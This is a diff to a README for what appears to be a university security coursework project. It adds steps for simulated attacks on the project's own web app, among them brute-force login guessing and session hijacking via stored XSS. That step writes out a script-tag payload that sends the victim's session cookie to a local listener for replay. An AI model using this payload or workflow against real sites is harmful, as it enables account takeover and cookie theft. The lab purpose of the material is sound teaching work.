@@ -71,6 +71,26 @@ ELEC0138_Group8/
 
 4. **Run the Attack Simulation**
 
+   - **Brute-force Login Attack**:
+     
+     1. Edit `brute_force.py` to set the target username (e.g. `victim@example.com`)  
+     2. Run `brute_force.py`  
+        → The script will simulate password guessing attempts by sending repeated login requests using common passwords.  
+        → A valid match will be printed to the terminal once found.  
+        > This simulates a real-world brute force scenario using multithreading and common credential dictionaries.
+
+   - **Session Hijacking via XSS**:
+     
+     1. Register a malicious username like:  
+        ```html
+        <script>new Image().src="http://localhost:8000/steal?cookie="+document.cookie</script>
+        ```
+     2. Run `listener.py`  
+        → This starts a listener on port 8000 to capture incoming cookies.
+
+     3. When a legitimate user visits the homepage, the malicious script will trigger and send their session cookie to the attacker.
+     4. Use `hijack_session.py`  
+        → Load the captured cookie and simulate a GET request to `/`, gaining unauthorized access as the victim.
    - **Phishing Simulation**:
      
      1. Run `send_phishing.py`  
@@ -88,7 +108,7 @@ ELEC0138_Group8/
      1. Run `model.py`  
         → This initializes and loads the phishing detection model.
 
-     2. Run `system.py`  
+     2. Run `combined_defences.py`  
         → This starts the Flask web interface for users to input URLs and receive detection results in Security Center.
 
 
